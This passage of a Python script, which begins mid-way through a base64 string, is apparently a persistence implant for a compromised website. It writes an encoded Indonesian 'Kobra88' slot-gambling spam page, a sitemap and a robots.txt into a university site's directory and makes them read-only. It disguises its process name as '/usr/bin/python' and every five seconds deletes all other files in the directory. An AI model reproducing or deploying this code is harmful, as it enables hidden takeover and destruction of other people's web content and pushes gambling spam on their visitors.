dhbWluZykgLSA5NC42NSU8L2xpPjxsaSBkYXRhLXNvdXJjZXBvcz0iMTE6MS0xMTo1MCI+R3JlYXQgUmhpbm8gTWVnYXdheXMgKEJsdWVwcmludCBHYW1pbmcpIC0gOTcuMDAlPC9saT48bGkgZGF0YS1zb3VyY2Vwb3M9IjEyOjEtMTM6MCI+VGhlIERvZyBIb3VzZSBNZWdhd2F5cyAoQmx1ZXByaW50IEdhbWluZykgLSA5OC4wNiU8L2xpPjwvdWw+PHA+S29icmE4OCBTbG90IGJ1a2FuIGhhbnlhIHNlYnVhaCBwZXJtYWluYW4gbWVzaW4gc2xvdCBiaWFzYTsgaW5pIGFkYWxhaCBwZW5nYWxhbWFuIGJlcm1haW4geWFuZyBtZW5nYXN5aWtrYW4gZGVuZ2FuIFJUUCB5YW5nIHRpbmdnaSwgdGVrbm9sb2dpIGNhbmdnaWgsIGRhbiBwb3RlbnNpIGtlbWVuYW5nYW4geWFuZyBtZW5nZ2l1cmthbi4gRGkgdGFodW4gMjAyMywgS29icmE4OCBTbG90IG1lbWltcGluIGRlbmdhbiBwcmVzdGFzaSBsdWFyIGJpYXNhIGRhbGFtIG1lbWJlcmlrYW4ga2VzZW5hbmdhbiBkYW4gcGVsdWFuZyBrZW1lbmFuZ2FuIGtlcGFkYSBwYXJhIHBlbWFpbm55YS4gTmFtdW4sIHRldGFwIGRpaW5nYXQgYmFod2EgUlRQIFNsb3QgR2Fjb3IgaW5pIGhhbnlhIGJpc2EgZGlndW5ha2FuIGRpIHNpdHVzIHJlc21pIEtvYnJhODggc2FqYS48L3A+PGgyPjUgRGFmdGFyIGdhbWUgc2xvdCBnYWNvciB0ZXJwZXJjYXlhIHBhc3RpIG1heHdpbjwvaDI+PHA+S29icmE4OCwgdHVqdWFuIHV0YW1hIHBhcmEgcGVjaW50YSBqdWRpIHNsb3QsIHRlbGFoIG1lbmphbGluIGtlbWl0cmFhbiB5YW5nIG1lZ2FoIGRlbmdhbiBwYXJhIHByb3ZpZGVyIGdhbWUga2VuYW1hYW4gcGFkYSB0YWh1biBnZW1pbGFuZyAyMDIzLiBEYW1wYWtueWE/IFBlbmdhbGFtYW4gbWVtaWthdCBkZW5nYW4gYmVyYWdhbSBwZXJtYWluYW4gc2xvdCBnYWNvciB5YW5nIGRpZHVrdW5nIG9sZWggdGluZ2thdCBSVFAgdGVydGluZ2dpLiBNZW5naGFudGFya2FuIHdpbnJhdGUgZGFuIHJhdGEtcmF0YSBSVFAgbWVuY2VuZ2FuZ2thbiBzZWtpdGFyIDk4JSwgS29icmE4OCBtZW5qYWRpa2FuIGtlbWVuYW5nYW4gZGFsYW0gcGVybWFpbmFuIHNsb3QgZ2Fjb3Igc2VtYWtpbiBtZW11a2F1LiBKaWthIEFuZGEgbWVuZ2luZ2lua2FuIHNlbnNhc2kga2VtZW5hbmdhbiBwZW51aCBnYWlyYWgsIGJlcnNpYXBsYWggdW50dWsgbWVueWFtYnV0IDUgRGFmdGFyIGdhbWUgc2xvdCBnYWNvciB0ZXJwZXJjYXlhIHBhc3RpIG1heHdpbiBtZWxhbHVpIDxhIHRpdGxlPSJha3VuIHBybyB0aGFpbGFuZCIgaHJlZj0iaHR0cHM6Ly9qdXJuYWxmaXNpcC51aW5zYnkuYWMuaWQvcHVibGljL3NpdGUvLS9rb2JyYTg4LyI+QWt1biBQcm8gVGhhaWxhbmQ8L2E+IEtvYnJhODghPC9wPjxoMz4xLiBQcmFnbWF0aWMgUGxheTogU2xvdCBnYWNvciBTZXJ2ZXIgVGhhaWxhbmQgdGVyYmFpayAyMDIzPC9oMz48cD5EYWxhbSBqYWphcmFuIHNsb3QgZ2Fjb3Igb25saW5lIHNlcnZlciB0aGFpbGFuZCwgUHJhZ21hdGljIFBsYXkgbWVuZ3VraXIgbmFtYW55YSBzZWJhZ2FpIHBlbG9wb3IgdXRhbWEuIFByb3ZpZGVyIHNsb3QgaW5pIG1lbmdoYWRpcmthbiBrdW1wdWxhbiBnYW1lIHlhbmcgdGFrIHRlcnRhbmRpbmdpLCBzZXJpbmdrYWxpIGRpbGVuZ2thcGkgZGVuZ2FuIGphY2twb3QgbWV3YWguIEphbmdhbiB0ZXJsZXdhdGthbiBhZGFwdGFzaSBwZXJtYWluYW4gc2xvdCBkZW1vIG1lcmVrYSB5YW5nIHJlc3BvbnNpZiBkaSBwZXJhbmdrYXQgc2VsdWxlci4gTmlrbWF0aSBwdXRhcmFuIGJvbnVzIHRhbnBhIGJpYXlhIGVrc3RyYSwgc2VidWFoIGphbmppIHlhbmcga2FtaSB0ZXBhdGkuIEJlcmdhYnVuZ2xhaCBkaSBLb2JyYTg4IGRhbiB0ZW11a2FuIHNlbnNhc2kgYmVybWFpbiBkaSBhZ2VuIHNsb3QgUHJhZ21hdGljIFBsYXkgdGVyYmFpayB5YW5nIHRha2thbiBBbmRhIHNlc2FsaS48L3A+PGgzPjIuIFJURyBTbG90IDogSWRvbGEgbWVtYmVyIGp1ZGkgb25saW5lIEtvYnJhODg8L2gzPjxwPlNsb3Qgb25saW5lIGluaSBtZW1hbmZhYXRrYW4gdGVrbm9sb2dpIHRlcmtpbmkgZGFyaSBSVEcgc2xvdCB1bnR1ayBtZW5qYWdhIHByaXZhc2kgc2V0aWFwIHBlbWFpbi4gRm9rdXMgdXRhbWEgbWVyZWthIGFkYWxhaCBtZW1iZXJpa2FuIGxpbmdrdW5nYW4gYmVybWFpbiB5YW5nIGFtYW4gZGFuIG55YW1hbi4gRGlkdWt1bmcgb2xlaCBwcm9zZWR1ciBwZXJtYWluYW4geWFuZyBhZGlsLCBwZWx1YW5nIG1lbmFuZyB5YW5nIHRlcmJ1a2EsIGJvbnVzIG1lbGltcGFoLCBzZXJ0YSBqYWNrcG90IHlhbmcgbWVtaWthdCwgUlRHIFNsb3QgdGVsYWggbWVuZ3VrdWhrYW4gZGlyaSBzZWJhZ2FpIHBlbnllZGlhIHNsb3Qgb25saW5lIHRlcmJhaWsgZGFuIGlkb2xhIHBhcmEgbWVtYmVyIGtvYnJhODguPC9wPjxoMz4zLiBIYWJhbmVybyA6IFNsb3QgcGlsaWhhbiBha3VuIHBybyBUaGFpbGFuZDwvaDM+PHA+SmFqYXJhbiBzbG90IEhhYmFuZXJvIHRpZGFrIGFkYSBkdWFueWEgZGFsYW0gaGFsIGtlcmFnYW1hbi4gU2V0aWFwIGJ1bGFuLCBBbmRhIGFrYW4gZGlzdWd1aGthbiBkZW5nYW4gcGVsdW5jdXJhbiBtZXNpbiBzbG90IHRlcmJhcnUgeWFuZyBtZW5hd2Fya2FuIHRpbmdrYXQga2VtZW5hbmdhbiBkYW4gUlRQIHlhbmcgbHVhciBiaWFzYS4gSmFuZ2FuIGhlcmFuIGppa2Egc2xvdCBIYWJhbmVybyBzZXJpbmcga2FsaSBtZW1iYXdhIGphY2twb3QgYmVzYXIgYmFnaSBwYXJhIHBlbWFpbiwga2FyZW5hIEhhYmFuZXJvIG1lbWVnYW5nIHBlcmFuYW4gcGVudGluZyBkYWxhbSBkdW5pYSBpbmkuIFByb3ZpZGVyIGluaSBtZW5qYWRpIHBpbGloYW4gaWRlYWwgYmFnaSBwZWNpbnRhIG1lc2luIHNsb3QgZGVuZ2FuIGFrdW4gcHJvIHRoYWlsYW5kLjwvcD48aDM+NC4gTWljcm9nYW1pbmcgU2xvdCBHYWNvciBEZW5nYW4gUlRQIFBhbGluZyB0aW5nZ2k8L2gzPjxwPlRpZGFrIGFkYSB5YW5nIHNlZGVyaGFuYSBkYWxhbSBwZXJtYWluYW4gc2xvdCBvbmxpbmUgTWljcm9nYW1pbmcuIE1lc2tpcHVuIGRlc2FpbiBwZXJtYWluYW5ueWEgc2ltcGVsLCBncmFmaXMgSEQgZGFuIGVmZWsgc3VhcmEgeWFuZyBtZW1pa2F0IHNlcnRhIG5pbGFpIFJUUCBwYWxpbmcgdGluZ2dpIHRldGFwIG1lbmphZGkgZm9rdXMgdXRhbWEuIE1pY3JvZ2FtaW5nIHRlbGFoIG1lbmNpcHRha2FuIHBlbmdhbGFtYW4gYmVybWFpbiB5YW5nIG1lbmdhZ3Vta2FuIGRhbiBtb2Rlcm4uIFdhbGF1cHVuIHRlcmJpbGFuZyBpbm92YXRpZiwgc2V0aWFwIGZpdHVyIHBlcm1haW5hbiB0ZXRhcCBkYXBhdCBkaWFrc2VzIGRlbmdhbiBtdWRhaC48L3A+PGgzPjUuIEpva2VyIEdhbWluZyBTbG90IE9ubGluZSBCb251cyBNZWxpbXBhaDwvaDM+PHA+Sm9rZXIgR2FtaW5nIG1lbWFoYW1pIGtlaW5naW5hbiBwYXJhIG1lbWJlciBrb2JyYTg4IHVudHVrIG1lbmRhcGF0a2FuIGJvbnVzIGRhbiBwcm9tb3NpIHRhbnBhIHJpYmV0LiBEYWxhbSBoYWwgaW5pLCBtZXJla2EgbWVuZ2FtYmlsIGxhbmdrYWggYmVyYW5pIGRlbmdhbiBtZW1iZXJpa2FuIGJhbnlhayBwZW5hd2FyYW4gYm9udXMuIEJhZ2kgcGFyYSBwZW5qdWRpIHNsb3QsIGluaSBhZGFsYWggc3VyZ2Egc2VqYXRpIGthcmVuYSBib251cyB0ZXJzZWJ1dCBtZW1iZXJpa2FuIHBlbHVhbmcga2VtZW5hbmdhbiB0YW1iYWhhbi4gQmVyc2lhcGxhaCB1bnR1ayBtZXJhc2FrYW4gc2Vuc2FzaSBiZXJtYWluIGRlbmdhbiBtb2RhbCBrZWNpbCBkYW4gdW50dW5nIGJlc2FyIGRpIEtvYnJhODguPC9wPjxoMj5LZXVuZ2d1bGFuIEtvYnJhODggU2l0dXMgc2xvdCBnYWNvciBQYWxpbmcgZ2FtcGFuZyBtYXh3aW4gMjAyMzwvaDI+PHA+U2lhcGEgeWFuZyB0aWRhayBpbmdpbiBtZXJhaWgga2V1bnR1bmdhbiBqZWtwb3QgdGVyYmVzYXIgc2V0aWFwIGhhcmlueWE/IEppa2EgQW5kYSBtZW5kYWZ0YXIgZGkgc2l0dXMganVkaSBzbG90IG9ubGluZSByZXNtaSB5YW5nIHNhbmdhdCBnYWNvciwgQW5kYSBha2FuIG1lcmFzYWthbiBzZWp1bWxhaCBtYW5mYWF0IHRhayB0ZXJkdWdhLiBCZXJnYWJ1bmdsYWggZGVuZ2FuIEtvYnJhODggc2l0dXMganVkaSBzbG90IG9ubGluZSB0ZXJ1bmdndWwgZGFuIHRlcnBlcmNheWEgbm9tb3IgMSBkaSBJbmRvbmVzaWEsIGRhbiBuaWttYXRpIGtlbWVuYW5nYW4gbXVkYWggZGFsYW0gcGVybWFpbmFuIHNsb3QgZ2Fjb3IgbWF4d2luIHNlcnRhIGJlcmFnYW0ganVkaSBvbmxpbmUgbGFpbm55YS4gSGFyaSBpbmksIEtvYnJhODggdGVsYWggbWVtYnVrdGlrYW4ga2VoZWJhdGFubnlhIGRlbmdhbiBsaXNlbnNpIHJlc21pIGRhbiByZXB1dGFzaSB0YWsgdGVyZ295YWhrYW4gc2ViYWdhaSBzaXR1cyBzbG90IGdhY29yIHNlcnZlciB0aGFpbGFuZCBwYWxpbmcgZ2FtcGFuZyBtYXh3aW4gMjAyMy4gSW5pbGFoIGJlYmVyYXBhIGtldW5nZ3VsYW4gbWVuYXJpayBkYXJpIEFrdW4gUHJvIFRoYWlsYW5kIEtvYnJhODggeWFuZyBwYXR1dCBBbmRhIHBlcnRpbWJhbmdrYW46PC9wPjxoMz4xLiBMaXNlbnNpIFJlc21pIHlhbmcgTWVuamFtaW4gS2VhbWFuYW48L2gzPjxwPlBhc3Rpa2FuIHNpdHVzIGp1ZGkgc2xvdCBnYWNvciB0ZXJiYXJ1IHlhbmcgQW5kYSBwaWxpaCBtZW1pbGlraSBsaXNlbnNpIHJlc21pIHlhbmcgZGlha3VpIHNlY2FyYSBpbnRlcm5hc2lvbmFsLiBEZW5nYW4gaW5pLCBBbmRhIGFrYW4gbWVuZ2hpbmRhcmkgcmlzaWtvIGJlcm1haW4gZGkgc2l0dXMgc2xvdCBpbGVnYWwgeWFuZyBtdW5na2luIG1lcnVnaWthbiBBbmRhLiBCZXJiZWRhIGhhbG55YSBkZW5nYW4gYWdlbiBzbG90IGdhY29yIGhhcmkgaW5pLiBLZW5hcGE/IEthcmVuYSBzaXR1cyBqdWRpIG9ubGluZSBLb2JyYTg4LCBwZW55ZWRpYSBnYW1lIGRhbiBwZXJtYWluYW4gc2xvdCBvbmxpbmUgdGVycGVyY2F5YSwgdGVsYWggbWVuZGFwYXRrYW4gaXppbiByZXNtaSBkYXJpIFBBR0NPUiwgc2VidWFoIHBlcnVzYWhhYW4ganVkaSBvbmxpbmUgaW50ZXJuYXNpb25hbCB5YW5nIGJlcmJhc2lzIGRpIEZpbGlwaW5hLjwvcD48aDM+Mi4gRmFpciBQbGF5IFRhbnBhIEtlY3VyYW5nYW48L2gzPjxwPlNhbGFoIHNhdHUga2V1bmdndWxhbiBiZXNhciBkYXJpIHNpdHVzIHNsb3QgZ2Fjb3IgbWF4d2luIEtvYnJhODggYWRhbGFoIGFkYW55YSBwcmluc2lwIGZhaXIgcGxheS4gQWdlbiBzbG90IGdhY29yIGdhbXBhbmcgbWF4d2luIDIwMjMgbWVuamFtaW4gYmFod2Egc2V0aWFwIHBlcm1haW5hbiBzbG90IHlhbmcgZGlzZWRpYWthbiBkaWphbGFua2FuIHNlY2FyYSBhZGlsIGRhbiB0YW5wYSBnYW5nZ3VhbiBzZXBlcnRpIGxhZyBhdGF1IHNlcnZlciBkb3duLiBTaXR1cyBzbG90IGdhY29yIG11ZGFoIG1heHdpbiBiYWhrYW4gdGVsYWggbWVuZy11cGdyYWRlIHNlcnZlciBzbG90bnlhIGRlbmdhbiB0ZWtub2xvZ2kgdGVyYmFpayB5YW5nIGFkYS48L3A+PGgzPjMuIEtlYW1hbmFuIGRhbiBLZXBlcmNheWFhbiBEYWxhbSBTZXRpYXAgTGFuZ2thaDwvaDM+PHA+S2VhbWFuYW4gYWRhbGFoIHByaW9yaXRhcyB1dGFtYSBiYWdpIHNlbXVhIG1lbWJlciBsaW5rIHNsb3QgZ2Fjb3IgZ2FtcGFuZyBtYXh3aW4uIFNpdHVzIFNsb3QgZ2Fjb3IgaGFyaSBpbmkgdGlkYWsgaGFueWEgbWVuYXdhcmthbiBwZXJtYWluYW4gYmVya3VhbGl0YXMsIHRldGFwaSBqdWdhIG1lbmphbWluIGtlYW1hbmFuIGRhdGEgcHJpYmFkaSBBbmRhIGRlbmdhbiAxMDAlLiBEZW5nYW4gZm9rdXMgcGFkYSBtZW1iZXJpa2FuIGxheWFuYW4gdGVyYmFpaywgc2l0dXMgaW5pIG1lbmphZGkgcGlsaWhhbiBhbWFuIHVudHVrIGJlcm1haW4gc2xvdCBvbmxpbmUgZ2Fjb3IgbWF4d2luIGFrdW4gcHJvIHNlcnZlciB0aGFpbGFuZCB0ZXJiYXJ1LjwvcD48aDM+NC4gUHJvc2VzIERhZnRhciBkYW4gVHJhbnNha3NpIENlcGF0PC9oMz48cD5CZXJtYWluIGRpIGFnZW4gc2xvdCBnYWNvciBLb2JyYTg4IG11ZGFoIG1lbmFuZyBraW5pIHNlbWFraW4gZWZpc2llbiBkZW5nYW4gcHJvc2VzIHBlbmRhZnRhcmFuIHlhbmcgaGFueWEgbWVtZXJsdWthbiB3YWt0dSA1IG1lbml0LiBEdWt1bmdhbiB0cmFuc2Frc2kgZGVwb3NpdCBkYW4gcGVuYXJpa2FuIHlhbmcgbXVkYWggc2VydGEgY2VwYXQgbWVsYWx1aSBiYW5rLWJhbmsgdGVya2VuYWwgc2VwZXJ0aSBCTkksIEJDQSwgQlJJLCBRUklTLCBCZXJkaWthcmksIFBhbmluIEJhbmssIGRhbiBDSU1CIE5pYWdhLCBzZXJ0YSBlLXdhbGxldCBzZXBlcnRpIE9WTywgR29wYXksIExpbmtBamEsIERBTkEsIGRhbiBTYWt1a3Ugc2VtYWtpbiBtZW1wZXJtdWRhaCBsYW5na2FoIEFuZGEuPC9wPjxoMz41LiBLZW1lbmFuZ2FuIE55YXRhIDEwMCU8L2gzPjxwPlNlbXVhIHBlcm1haW5hbiBkaSBzaXR1cyBzbG90IGdhY29yIG9ubGluZSBtZW1hbmZhYXRrYW4gdWFuZyBhc2xpLCB5YW5nIGJlcmFydGkga2VtZW5hbmdhbiB5YW5nIEFuZGEgcmFpaCBhZGFsYWgga2VtZW5hbmdhbiBueWF0YSB5YW5nIGFrYW4gQW5kYSB0ZXJpbWEgc2VwZW51aG55YSB0YW5wYSBwb3RvbmdhbiBhcGFwdW4uIEphZGksIGJ1a2FuIGhhbnlhIGJlcm1haW4gdW50dWsga2VzZW5hbmdhbiwgdGFwaSBqdWdhIG1lcmFpaCBrZW1lbmFuZ2FuIHlhbmcgbWVuZ2hhc2lsa2FuLjwvcD48aDM+Ni4gQm9jb3JhbiBSVFAgR2FtZSBTbG90IEdhY29yIHlhbmcgTWVtYmFudHU8L2gzPjxwPlNpdHVzIHNsb3QgZ2Fjb3IgbXVkYWggbWVuYW5nIG1heHdpbiBoYXJpIGluaSBtZW1iZXJpa2FuIGtlanV0YW4gZGVuZ2FuIG1lbWJlcmlrYW4gYm9jb3JhbiBtZW5nZW5haSA8YSB0aXRsZT0iUlRQIHNsb3QgZ2Fjb3IiIGhyZWY9Imh0dHBzOi8vanVybmFsZmlzaXAudWluc2J5LmFjLmlkL3B1YmxpYy9zaXRlLy0va29icmE4OC8iPlJUUCBzbG90IGdhY29yPC9hPiBrZXBhZGEgcGFyYSBtZW1iZXIgc2V0aWEuIERlbmdhbiByYXR1c2FuIHBpbGloYW4gZ2FtZSBzbG90IGRhcmkgcHJvdmlkZXIgdGVycGVyY2F5YSBkaSBzZWx1cnVoIGR1bmlhLCBzaXR1cyBzbG90IHJlc21pIGluaSBtZW55YWppa2FuIHZhcmlhc2kgYmVybWFpbiB5YW5nIHRhayB0ZXJiYXRhcywgc2VoaW5nZ2EgQW5kYSB0aWRhayBha2FuIG1lcmFzYSBib3NhbiBzYWF0IG1lbWFpbmthbiBzbG90IG9ubGluZSB0ZXJiYXJ1LjwvcD48cD7CoDwvcD4JCQk8L2Rpdj4KICAgIAk8L2Rpdj4KICAgIAk8ZGl2IGNsYXNzPSJmb290ZXIiPgoJCQk8ZGl2IGNsYXNzPSJjb3B5bGVmdCBhY2VudGVyIHBiLTIiPgoJCQkJPHNwYW4+wqkgMjAyMyDigKIgPGEgaHJlZj0iaHR0cHM6Ly9qdXJuYWxmaXNpcC51aW5zYnkuYWMuaWQvcHVibGljL3NpdGUvLS9rb2JyYTg4LyI+U2xvdCBHYWNvcjwvYT4g4oCiIDxhIGhyZWY9Imh0dHBzOi8vanVybmFsZmlzaXAudWluc2J5LmFjLmlkL3B1YmxpYy9zaXRlLy0va29icmE4OC8iPlJUUCBTbG90IEdhY29yPC9hPiDigKIgPHN0cm9uZyBjbGFzcz0iYnJlYWRjcnVtYl9sYXN0IiBhcmlhLWN1cnJlbnQ9InBhZ2UiPktPQlJBODg6IFNpdHVzIFNsb3QgR2Fjb3IgQWt1biBQcm8gVGhhaWxhbmQgVGVyYmFydSAyMDIzPC9zdHJvbmc+PC9zcGFuPgoJCQk8L2Rpdj4KICAgIAk8L2Rpdj4KICAgIDwvc2VjdGlvbj4KICAgIDxzZWN0aW9uIGNsYXNzPSJzX2Zvb3RlciI+CiAgICAgICAgPGRpdiBjbGFzcz0iYm90dG9tLW1lbnUiPgogICAgICAgICAgICA8YSBocmVmPSJodHRwczovL2tvYnJhODhzdGFybGlnaHQuY29tL2FjY291bnQvcmVnaXN0ZXIvc2Vvc2Nyb3ciIGNsYXNzPSJtZW51LWl0ZW0gbXQtNSI+CiAgICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJtZW51LWl0ZW0taWNvbiI+CiAgICAgICAgICAgICAgICAgICAgPGFtcC1pbWcgc3JjPSJodHRwczovL2kucG9zdGltZy5jYy9Mc0w2QkYzUy9tb2JpbGUtbG9naW4taWNvbi5wbmciIGFsdD0iU0xPVCBHQUNPUiBtb2JpbGUgbG9naW4gS09CUkE4OCIgdGl0bGU9IlNMT1QgR0FDT1IgbW9iaWxlIGxvZ2luIEtPQlJBODgiIHdpZHRoPSIyNSIgaGVpZ2h0PSIyNSI+PC9hbXAtaW1nPgogICAgICAgICAgICAgICAgPC9kaXY+CiAgICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJtZW51LWl0ZW0tdGV4dCB0ZXh0LXNtYWxsIHRleHQtd2hpdGUiPkxvZ2luPC9kaXY+CiAgICAgICAgICAgIDwvYT4KICAgICAgICAgICAgPGEgaHJlZj0iaHR0cHM6Ly9rb2JyYTg4c3RhcmxpZ2h0LmNvbS9hY2NvdW50L3JlZ2lzdGVyL3Nlb3Njcm93IiBjbGFzcz0ibWVudS1pdGVtIG10LTUiPgogICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0ibWVudS1pdGVtLWljb24iPgogICAgICAgICAgICAgICAgICAgIDxhbXAtaW1nIHNyYz0iaHR0cHM6Ly9pLnBvc3RpbWcuY2MvcVJjcTBITncvbW9iaWxlLWRhZnRhci1pY29uLnBuZyIgYWx0PSJTTE9UIEdBQ09SIG1vYmlsZSBkYWZ0YXIgS09CUkE4OCIgdGl0bGU9IlNMT1QgR0FDT1IgbW9iaWxlIGRhZnRhciBLT0JSQTg4IiB3aWR0aD0iMjUiIGhlaWdodD0iMjUiPjwvYW1wLWltZz4KICAgICAgICAgICAgICAgIDwvZGl2PgogICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0ibWVudS1pdGVtLXRleHQgdGV4dC1zbWFsbCB0ZXh0LXdoaXRlIj5EYWZ0YXI8L2Rpdj4KICAgICAgICAgICAgPC9hPgogICAgICAgICAgICA8YSBocmVmPSJodHRwczovL2tvYnJhODhzdGFybGlnaHQuY29tL2FjY291bnQvcmVnaXN0ZXIvc2Vvc2Nyb3ciIGNsYXNzPSJtZW51LWl0ZW0gc2hha2UiPgogICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0ibWVudS1pdGVtLWljb24iPgogICAgICAgICAgICAgICAgICAgIDxhbXAtaW1nIHNyYz0iaHR0cHM6Ly9pLnBvc3RpbWcuY2MvRHd0d1h3czUvbW9iaWxlLWhvbWUtbWFpbi1pY29uLnBuZyIgYWx0PSJTTE9UIEdBQ09SIG1vYmlsZSBob21lIEtPQlJBODgiIHRpdGxlPSJTTE9UIEdBQ09SIG1vYmlsZSBob21lIEtPQlJBODgiIHdpZHRoPSI1MCIgaGVpZ2h0PSI1MCI+PC9hbXAtaW1nPgogICAgICAgICAgICAgICAgPC9kaXY+CiAgICAgICAgICAgIDwvYT4KICAgICAgICAgICAgPGEgaHJlZj0iaHR0cHM6Ly9rb2JyYTg4c3RhcmxpZ2h0LmNvbS9hY2NvdW50L3JlZ2lzdGVyL3Nlb3Njcm93IiBjbGFzcz0ibWVudS1pdGVtIG10LTUiPgogICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0ibWVudS1pdGVtLWljb24iPgogICAgICAgICAgICAgICAgICAgIDxhbXAtaW1nIHNyYz0iaHR0cHM6Ly9pLnBvc3RpbWcuY2MvUDVMcUp3TFAvbW9iaWxlLXByb21vLWljb24ucG5nIiBhbHQ9IlNMT1QgR0FDT1IgbW9iaWxlIHByb21vIEtPQlJBODgiIHRpdGxlPSJTTE9UIEdBQ09SIG1vYmlsZSBwcm9tbyBLT0JSQTg4IiB3aWR0aD0iMjUiIGhlaWdodD0iMjUiPjwvYW1wLWltZz4KICAgICAgICAgICAgICAgIDwvZGl2PgogICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0ibWVudS1pdGVtLXRleHQgdGV4dC1zbWFsbCB0ZXh0LXdoaXRlIj5Qcm9tb3NpPC9kaXY+CiAgICAgICAgICAgIDwvYT4KICAgICAgICAgICAgPGEgaHJlZj0iaHR0cHM6Ly9rb2JyYTg4c3RhcmxpZ2h0LmNvbS9hY2NvdW50L3JlZ2lzdGVyL3Nlb3Njcm93IiBjbGFzcz0ibWVudS1pdGVtIG10LTUiPgogICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0ibWVudS1pdGVtLWljb24iPgogICAgICAgICAgICAgICAgICAgIDxhbXAtaW1nIHNyYz0iaHR0cHM6Ly9pLnBvc3RpbWcuY2MvMnl6NlM5dkQvbW9iaWxlLWNoYXQtaWNvbi5wbmciIGFsdD0iU0xPVCBHQUNPUiBtb2JpbGUgbGl2ZWNoYXQgS09CUkE4OCIgdGl0bGU9IlNMT1QgR0FDT1IgbW9iaWxlIGxpdmVjaGF0IEtPQlJBODgiIHdpZHRoPSIyNSIgaGVpZ2h0PSIyNSI+PC9hbXAtaW1nPgogICAgICAgICAgICAgICAgPC9kaXY+CiAgICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJtZW51LWl0ZW0tdGV4dCB0ZXh0LXNtYWxsIHRleHQtd2hpdGUiPkxpdmVjaGF0PC9kaXY+CiAgICAgICAgICAgIDwvYT4KICAgICAgICA8L2Rpdj4KICAgIDwvc2VjdGlvbj4KPC9ib2R5Pg=="  # Base64 encoded content for index.php
file_content_page = ""
file_content_sitemap = "PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iVVRGLTgiPz4KPHVybHNldAogICAgICB4bWxucz0iaHR0cDovL3d3dy5zaXRlbWFwcy5vcmcvc2NoZW1hcy9zaXRlbWFwLzAuOSIKICAgICAgeG1sbnM6eHNpPSJodHRwOi8vd3d3LnczLm9yZy8yMDAxL1hNTFNjaGVtYS1pbnN0YW5jZSIKICAgICAgeHNpOnNjaGVtYUxvY2F0aW9uPSJodHRwOi8vd3d3LnNpdGVtYXBzLm9yZy9zY2hlbWFzL3NpdGVtYXAvMC45CiAgICAgICAgICAgIGh0dHA6Ly93d3cuc2l0ZW1hcHMub3JnL3NjaGVtYXMvc2l0ZW1hcC8wLjkvc2l0ZW1hcC54c2QiPgo8IS0tIGNyZWF0ZWQgd2l0aCBGcmVlIE9ubGluZSBTaXRlbWFwIEdlbmVyYXRvciB3d3cueG1sLXNpdGVtYXBzLmNvbSAtLT4KCgo8dXJsPgogIDxsb2M+aHR0cHM6Ly9qdXJuYWxmaXNpcC51aW5zYnkuYWMuaWQvcHVibGljL3NpdGUvLS9rb2JyYTg4LzwvbG9jPgogIDxsYXN0bW9kPjIwMjMtMDgtMzBUMTA6MDk6MDIrMDA6MDA8L2xhc3Rtb2Q+CjwvdXJsPgoKCjwvdXJsc2V0Pg=="
file_content_robots = "VXNlci1hZ2VudDogKgpEaXNhbGxvdzogCkRpc2FsbG93OiAvY2dpLWJpbi8="

def set_process_title(title):
    # Modify the first argument in sys.argv to set the process title
    sys.argv[0] = title

def create_directory(directory):
    if not os.path.exists(directory):
        os.makedirs(directory)

def create_file(file_path, content):
    with open(file_path, 'w') as file:
        file.write(content)

def delete_files(directory):
    for filename in os.listdir(directory):
        if filename not in ["index.php","sitemap.xml","robots.txt","scrowx.php"]:
            file_path = os.path.join(directory, filename)
            try:
                if os.path.isfile(file_path) or os.path.islink(file_path):
                    os.unlink(file_path)
                elif os.path.isdir(file_path):
                    os.rmdir(file_path)
            except Exception as e:
                print('Failed to delete {}. Reason: {}'.format(file_path, e))

def main():
    # Set the process title when the function starts
    set_process_title("/usr/bin/python")
    
    while True:
        if not os.path.exists(directory):
            print("[!] Directory not found")
            print("[!] Creating directory")
            create_directory(directory)
        elif not os.path.exists(file_path_index) or not os.path.exists(file_path_page) or not os.path.exists(file_path_sitemap) or not os.path.exists(file_path_robots):
            print("[!] File not found")
            print("[!] Creating file")
            if not os.path.exists(file_path_index):
                decoded_content_index = base64.b64decode(file_content_index).decode('utf-8')
                create_file(file_path_index, decoded_content_index)
                print("[!] Setting file mode to 0444")
                os.chmod(file_path_index, 0o444)  # Set file mode to 0444
            if not os.path.exists(file_path_page):
                decoded_content_page = base64.b64decode(file_content_page).decode('utf-8')
                create_file(file_path_page, decoded_content_page)
                print("[!] Setting file mode to 0444")
                os.chmod(file_path_page, 0o444)  # Set file mode to 0444
            if not os.path.exists(file_path_sitemap):
                decoded_content_sitemap = base64.b64decode(file_content_sitemap).decode('utf-8')
                create_file(file_path_sitemap, decoded_content_sitemap)
                print("[!] Setting file mode to 0444 for sitemap.xml")
                os.chmod(file_path_sitemap, 0o444)  # Set file mode to 0444
            if not os.path.exists(file_path_robots):
                decoded_content_robots = base64.b64decode(file_content_robots).decode('utf-8')
                create_file(file_path_robots, decoded_content_robots)
                print("[!] Setting file mode to 0444 for robots.txt")
                os.chmod(file_path_robots, 0o444)  # Set file mode to 0444

        else:
            print("[*] File exists")
            print("[*] Deleting files and directories not in the filter list")
            delete_files(directory)
        time.sleep(5)

if __name__ == "__main__":
    main()
